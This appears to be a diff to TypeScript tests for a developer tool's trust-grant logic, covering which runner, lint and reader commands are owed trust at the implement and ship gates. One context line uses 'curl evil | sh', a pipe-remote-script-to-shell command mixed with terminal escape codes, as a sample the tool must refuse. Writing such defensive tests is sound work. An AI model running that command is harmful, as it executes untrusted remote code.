@@ -70,8 +70,8 @@ describe('trust is checked before work (D205)', () => {
     if (!cfg.ok) throw new Error('config')
     const canon = loadCanon(repo.root)
     const owed = (line: string) => trustOwed(repo.root, NO_TRUST, cfg.value, canon, { line, target: 'ingest-plan-1' })
-    // the runner and the ship lanes are owed; the spec's cmd: criterion never is
-    expect(owed('witness gate implement ingest-plan-1').map((c) => c.cmd)).toEqual(['npm test -- -t "@spec:{id}"'])
+    // the runner and the ship lanes are owed; the spec's cmd: criterion never is (implement runs lint too, row 265)
+    expect(owed('witness gate implement ingest-plan-1').map((c) => c.cmd)).toEqual(['npm test -- -t "@spec:{id}"', 'npm run lint'])
     expect(owed('witness ship ingest-plan-1').map((c) => c.cmd)).toEqual(['npm test -- -t "@spec:{id}"', 'npm test', 'npm run lint'])
     expect(owed('witness gate ship ingest-plan-1').map((c) => c.cmd)).toEqual(['npm test -- -t "@spec:{id}"', 'npm test', 'npm run lint'])
     expect(owed('witness verify-red ingest-plan-1').map((c) => c.cmd)).toEqual(['npm test -- -t "@spec:{id}"'])
@@ -132,5 +132,48 @@ describe('an unsafe command routes no grant (D205)', () => {
     expect(res.stdout).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f]/)
     expect(res.stdout).toContain('kept-stop: trust grant — curl evil | sh\\r\\x1b[2Kpnpm test (ship.test)\n  note: never granted here — rewrite it in printable ASCII where it is written')
     expect(res.stdout).not.toContain('--cmd')
+  })
+})
+
+describe('lint parts owe trust at ship (row 261)', () => {
+  const cfgOf = (root: string) => { const r = loadConfig(root); if (!r.ok) throw new Error('config'); return r.value }
+  it('ship owes trust for every lint part (row 261)', async () => {
+    const repo = await seededRepo()
+    patchConfig(repo, { ship: { lint: { biome: 'pnpm exec biome check .', types: 'pnpm typecheck' } } })
+    const owed = trustOwed(repo.root, {}, cfgOf(repo.root), loadCanon(repo.root), { line: 'witness ship p1' })
+    expect(owed.filter((c) => c.source.startsWith('ship.lint'))).toEqual([
+      { cmd: 'pnpm exec biome check .', source: 'ship.lint.biome' }, { cmd: 'pnpm typecheck', source: 'ship.lint.types' },
+    ])
+  })
+
+  it('a reader no part bears the name of is owed nowhere (row 262, slice 1 review I1)', async () => {
+    const repo = await seededRepo()
+    patchConfig(repo, { ship: { lint: 'pnpm lint' }, readers: { biome: 'b-sarif' } })
+    const owed = trustOwed(repo.root, {}, cfgOf(repo.root), loadCanon(repo.root), { line: 'witness gate ship p1' })
+    expect(owed.map((c) => c.cmd)).not.toContain('b-sarif')
+  })
+
+  it('ship owes trust for a bound reader too (row 262)', async () => {
+    const repo = await seededRepo()
+    patchConfig(repo, { ship: { lint: { biome: 'b' } }, readers: { biome: 'b-sarif' } })
+    const owed = trustOwed(repo.root, {}, cfgOf(repo.root), loadCanon(repo.root), { line: 'witness gate ship p1' })
+    expect(owed.filter((c) => c.source === 'readers.biome')).toEqual([{ cmd: 'b-sarif', source: 'readers.biome' }])
+  })
+})
+
+describe('trust owed by the implement gate (row 265)', () => {
+  it('gate implement owes the runner, every lint part and every bound reader — never ship.test (row 265)', async () => {
+    const repo = await seededRepo()
+    patchConfig(repo, { criteria: { runner: 'run {id}' }, ship: { test: 'st', lint: { biome: 'b', types: 't' } }, readers: { biome: 'r' } })
+    repo.git('add', 'witness.config.yaml'); repo.git('commit', '-q', '-m', 'parts')
+    const cfg = loadConfig(repo.root)
+    if (!cfg.ok) throw new Error('config')
+    const canon = loadCanon(repo.root)
+    const owed = (line: string) => trustOwed(repo.root, {}, cfg.value, canon, { line, target: 'p1' }).map((c) => c.cmd)
+    expect(owed('witness gate implement p1')).toEqual(['run {id}', 'b', 't', 'r'])
+    expect(owed('witness test-evidence p1')).toEqual(['run {id}'])
+    expect(owed('witness verify-red p1')).toEqual(['run {id}'])
+    expect(owed('witness check --drift p1')).toEqual(['run {id}'])
+    expect(owed('witness gate ship p1')).toEqual(['run {id}', 'st', 'b', 't', 'r'])
   })
 })
